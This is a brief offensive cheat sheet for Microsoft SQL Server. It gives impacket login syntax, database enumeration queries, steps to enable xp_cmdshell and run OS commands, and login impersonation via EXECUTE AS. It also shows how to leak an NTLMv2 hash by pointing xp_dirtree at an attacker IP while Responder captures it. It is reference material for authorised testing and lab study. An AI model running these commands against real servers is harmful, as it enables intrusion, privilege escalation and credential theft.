
### Authentication

**Authenticate using impacket**
```bash
impacket-mssqlclient <domain>/<user>:'<pass>'@<IP> -windows-auth
```


### Enumeration

| Command                                         | Info           |
| ----------------------------------------------- | -------------- |
| `SELECT @@version;`                             | Get DB version |
| `SELECT name FROM sys.databases;`               | List databases |
| `SELECT name FROM master.dbo.sysdatabases;`     | List databases |
| `USE <DB>;`                                     | Select DB      |
| `SELECT * FROM <DB>.information_schema.tables;` | List tables    |
| `SELECT * FROM <DB>.dbo.<table>;`               | Query table    |


### Attacks

**Command injection:**

Command execution in 1 command:
```shell
EXECUTE sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE

EXECUTE xp_cmdshell 'whoami'
```

**Impersonate users:**

Find users you can impersonate:
```bash
SQL (HAERO\discovery  guest@msdb)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

name             
--------------   
hrappdb-reader  
```

Impersonate the user:
```bash
EXECUTE AS LOGIN = 'hrappdb-reader'
```

**Leak NTLMv2 hash**
```bash
sudo responder -I tun0 -A # Analyze mode
xp_dirtree \\<IP>\test
```
